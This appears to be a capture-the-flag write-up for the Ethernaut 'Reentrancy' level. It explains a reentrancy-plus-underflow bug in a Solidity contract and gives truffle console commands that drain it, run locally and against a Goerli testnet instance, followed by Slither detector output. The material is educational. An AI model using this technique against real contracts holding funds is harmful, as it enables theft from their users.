# Reentrancy

[Reentrancy](https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb)

_Steal all the funds from the contract._


This contract is vulnerable to re-entrancy and has an underflow bug too.  Re-entrancy allows us to call back and over-withdraw. The underflow vulnerability allows us to get away with the attack as the balance underflow does not throw an error.

The solidity version of the vulnerable contract is very important.
From Solidity 0.8.x underflow protection is included. This effectively blocks the attack. 

Specifically the withdraw() line:
```JS
balances[msg.sender] -= _amount;
```

Extra dependency:
```BASH
npm i @openzeppelin/contracts
```

<BR />

## Test Attack

```BASH
truffle develop
```

```JS
migrate

r1 = await Reentrance.deployed()
await r1.donate(accounts[1], {from: accounts[5], value: 12300})

attack = await Attack.deployed()
await attack.donate({value: 10000})
await web3.eth.getBalance(r1.address)
(await r1.balanceOf(accounts[1])).toString()
(await r1.balanceOf(attack.address)).toString()
await attack.withdraw(10000)

await web3.eth.getBalance(attack.address)
await web3.eth.getBalance(r1.address)
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```

```JS
r1 = await Reentrance.at("0x9C26748d6e0803A3094da1805b1579B7831E628C")
await web3.eth.getBalance(r1.address)

attack = await Attack.deployed()
sender = accounts[5]
await attack.donate({from: sender, value: 1E16})
await attack.withdraw("10000000000000000", {from: sender, gas: 100000})
```

<BR />


## Vulnerability Testing Tools


<BR />

### Slither

__Bug Detect:__ Reentrancy.

__Bug Not Detect:__ Underflow.


```BASH
solc-select use 0.6.12
slither ./contracts/Reentrance.sol  --truffle-ignore-compile  --exclude-optimization 
```

```
Reentrancy in Reentrance.withdraw(uint256) (contracts/Reentrance.sol#19-27):
        External calls:
        - (result) = msg.sender.call{value: _amount}() (contracts/Reentrance.sol#21)
        State variables written after the call(s):
        - balances[msg.sender] -= _amount (contracts/Reentrance.sol#25)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities

Low level call in Reentrance.withdraw(uint256) (contracts/Reentrance.sol#19-27):
        - (result) = msg.sender.call{value: _amount}() (contracts/Reentrance.sol#21)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#low-level-calls

Parameter Reentrance.donate(address)._to (contracts/Reentrance.sol#10) is not in mixedCase
Parameter Reentrance.balanceOf(address)._who (contracts/Reentrance.sol#15) is not in mixedCase
Parameter Reentrance.withdraw(uint256)._amount (contracts/Reentrance.sol#19) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions

Redundant expression "_amount (contracts/Reentrance.sol#23)" inReentrance (contracts/Reentrance.sol#5-31)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#redundant-statements
./contracts/Reentrance.sol analyzed (1 contracts with 76 detectors), 6 result(s) found
```
